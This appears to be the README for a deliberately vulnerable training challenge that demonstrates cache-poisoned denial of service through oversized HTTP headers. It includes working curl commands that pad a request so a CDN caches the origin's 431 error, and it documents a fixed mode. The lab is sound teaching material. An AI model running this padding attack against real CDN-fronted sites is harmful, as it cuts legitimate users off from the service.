# CPDoS: HTTP Header Oversize (HHO)

This challenge demonstrates the "HTTP Header Oversize" cache poisoning denial-of-service pattern: the shared cache/CDN accepts request header blocks up to 20480 bytes, but the origin behind it only accepts up to 8192 bytes and returns `431 Request Header Fields Too Large` beyond that. In the vulnerable configuration, the CDN caches that error response and replays it to every subsequent, legitimate caller of the same URL.

## How to run it

```bash
go run main.go serve
```

## Endpoint

- `GET /` — returns `welcome` for normal requests

## Exploiting it

```bash
# craft a header block between the origin's limit (8192) and the CDN's limit (20480)
PADDING=$(python3 -c "print('A' * 10000)")

curl -s -D - -H "X-Padding: $PADDING" http://localhost:8080/ -o /dev/null

# any subsequent, legitimate caller of "/" now gets the cached 431 error
curl -s -D - http://localhost:8080/ -o /dev/null
```

## Modes

The server supports two modes, toggled with the `--vulnerable` flag on the `serve` command (defaults to `true`):

```bash
# vulnerable: the origin's 431 error response is cached and replayed to later callers
go run main.go serve --vulnerable=true

# fixed: error responses are never cached, regardless of what triggered them
go run main.go serve --vulnerable=false
```

## Disclaimer

This challenge is intentionally vulnerable. Do not deploy it on a publicly accessible server, as this could expose you to attacks.

Learn more about API security at [Cerberauth](https://www.cerberauth.com/)
